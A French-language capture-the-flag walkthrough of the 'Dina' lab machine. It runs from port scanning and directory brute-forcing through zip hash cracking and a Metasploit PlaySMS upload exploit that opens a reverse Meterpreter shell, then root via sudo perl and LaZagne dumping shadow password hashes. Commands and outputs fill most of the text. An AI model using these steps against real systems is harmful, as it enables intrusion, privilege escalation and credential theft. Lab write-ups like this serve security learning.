\# Dina

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo ./massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.253
[i] Rate: 1000
 
🔥 Masscan 192.168.56.253...100%
👁️ Nmap 192.168.56.253...100%
 
[+] 80/tcp open
 
==========================================================
|                         📑 Rapports                    |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.253-tcp.html     |
==========================================================
```

&nbsp;

**<span style="color: #dddddd;">👊</span> Gobuster**

Voyons les `directory` cachés sur ce serveur web

```
┌─[m0rph3u5@parrot]─[~/Massap]
└──╼ $gobuster dir -u http://192.168.56.253/ -w /usr/share/dirb/wordlists/big.txt -x html,php,txt,zip,bak,php.bak -s '200,301' -b ""
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://192.168.56.253/
[+] Method:         GET
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
[+] Status codes:   200,301
[+] User Agent:     gobuster/3.6
[+] Extensions:     php,txt,zip,bak,php.bak,html
[+] Timeout:        10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 3618]
/index.html           (Status: 200) [Size: 3618]
/nothing              (Status: 301) [Size: 318] [--> http://192.168.56.253/nothing/]
/robots               (Status: 200) [Size: 102]
/robots.txt           (Status: 200) [Size: 102]
/robots.txt           (Status: 200) [Size: 102]
/secure               (Status: 301) [Size: 317] [--> http://192.168.56.253/secure/]
/tmp                  (Status: 301) [Size: 314] [--> http://192.168.56.253/tmp/]
/uploads              (Status: 301) [Size: 318] [--> http://192.168.56.253/uploads/]
Progress: 143283 / 143290 (100.00%)
===============================================================
Finished
===============================================================
```

&nbsp;

Répertoire `nothing` contient des mot de passe

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $curl http://192.168.56.253/nothing/
<html>
<head><title>404 NOT FOUND</title></head>
<body>
<!--
#my secret pass
freedom
password
helloworld!
diana
iloveroot
-->
<h1>NOT FOUND</html>
<h3>go back</h3>
</body>
</html>
```

&nbsp;

Téléchargement du fichier `backup.zip`

```
┌──[m0rph3u5@parrot]─[~]
└──╼ $wget http://192.168.56.253/secure/backup.zip
--2025-09-30 21:30:39--  http://192.168.56.253/secure/backup.zip
Connexion à 192.168.56.253:80… connecté.
requête HTTP transmise, en attente de la réponse… 200 OK
Taille : 336 [application/zip]
Sauvegarde en : « backup.zip »

backup.zip                                      100%[=====================================================================================================>]     336  --.-KB/s    ds 0s      

2025-09-30 21:30:39 (12,2 MB/s) — « backup.zip » sauvegardé [336/336]
```

&nbsp;

L’archive est chiffrer

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $file backup.zip
backup.zip: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
```

&nbsp;

<span style="color: #dddddd;">💣</span> **Zip2john**

Récupère le hash du fichier `bakup.zip`

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $zip2john backup.zip
backup.zip/backup-cred.mp3:$zip2$*0*1*0*f7fbed2094d28bc9*841a*82*67ec429908caf33cfc34e5c3f30a13a23747c4dfe17914274b6e404d2b59d8dcec9f8dc549ce43ac4b5d2a2ff104f98aba748d566a8480df978f0a8f4cf4f485b2414d1328304207d7044d604e80b009828b56dac4d8a3f876464c9d9de757e20f2c612dff6839c4f9ec7bdd10c168be5624b860f860dda8f749597302f9fc10a14f*e6da1038b02c0bc7bd4c*$/zip2$:backup-cred.mp3:backup.zip:backup.zip
```

&nbsp;

<span style="color: #dddddd;">🧨</span> **JohnTheRipper**

Crack du hash

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $john backup-hash 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 130 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
freedom          (backup.zip/backup-cred.mp3)     
1g 0:00:00:01 DONE 2/3 (2025-09-30 21:39) 1.000g/s 40808p/s 40808c/s 40808C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

&nbsp;

Extraction du fichier `MP3`

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $7z x -p"freedom" backup.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=fr_FR.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i7-6700K CPU @ 4.00GHz (506E3),ASM,AES-NI)

Scanning the drive for archives:
1 file, 336 bytes (1 KiB)

Extracting archive: backup.zip
--
Path = backup.zip
Type = zip
Physical Size = 336

Everything is Ok

Size:       176
Compressed: 336
```

&nbsp;

URL & utilisateur trouver dans le fichier `MP3`

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $cat backup-cred.mp3 

I am not toooo smart in computer .......dat the resoan i always choose easy password...with creds backup file....

uname: touhid
password: ******


url : /SecreTSMSgatwayLogin
```

&nbsp;

**<span style="color: #dddddd;">💥</span> Metasploit - playsms_uploadcsv_exec**

Apres avoir chercher sur `MSF` j’ai fini par trouver cette exploit

```
[msf](Jobs:0 Agents:0) exploit(multi/http/playsms_uploadcsv_exec) >> run
[*] Started reverse TCP handler on 192.168.56.149:4444 
[+] X-CSRF-Token for login : 2f8d9b4c5ce5524397af7a79eed444e5
[*] Trying to Login ......
[+] Authentication successful: touhid:diana
[+] X-CSRF-Token for upload : bbf9c6956b643dcd9bbe2c0d9aa05c95
[*] Trying to upload malicious CSV file ....
[*] Sending stage (40004 bytes) to 192.168.56.253
[*] Meterpreter session 1 opened (192.168.56.149:4444 -> 192.168.56.253:49281) at 2025-09-30 21:55:19 +0200

(Meterpreter 1)(/var/www/SecreTSMSgatwayLogin) >
```

&nbsp;

🛰️ **fullEx**

Élévation de privilège

```
www-data@Dina:/tmp/fullEx$ bash fullEx.sh -perm
www-data@Dina:/tmp/fullEx$ ./fullEx.sh -LinPeas
   
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for www-data on this host:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/perl
```

&nbsp;

**<span style="color: #dddddd;">#️⃣</span> GTFobin - perl**

https://gtfobins.github.io/gtfobins/perl/#sudo

```
www-data@Dina:/tmp/fullEx$ sudo perl -e 'exec "/bin/sh";'
sudo perl -e 'exec "/bin/sh";'
id
uid=0(root) gid=0(root) groups=0(root)
bash -i
bash: no job control in this shell
root@Dina:/tmp/fullEx$#
```

&nbsp;

🛰️ **fullEx**

Cherchons les mot de passe sur la machine

```
root@Dina:/tmp/fullEx# ./fullEx.sh -LaZagne
./fullEx.sh -LaZagne

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: root
Hash: $6$A4cfTXmt$/VQJMjVmaXTdQ6MoJYLBOev9AE01dQ6Xa4kwd2DY4jOFjwNRIPcf9f0Vce3bLXzCkpBA.nefWzNBPOFebl4Cs.:17455:0:99999:7:::

[+] Hash found !!!
Login: touhid
Hash: $6$ZR2siqnl$TRqjGHJsbpN3WnPwbulM1HhIJf61bsKI48mGRixNZT7m/mTtLYmw/BM95m/GghAdoRCgBTwA/5HW4qA78NsIJ0:17455:0:99999:7:::


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 13.6959290504
```

&nbsp;

&nbsp;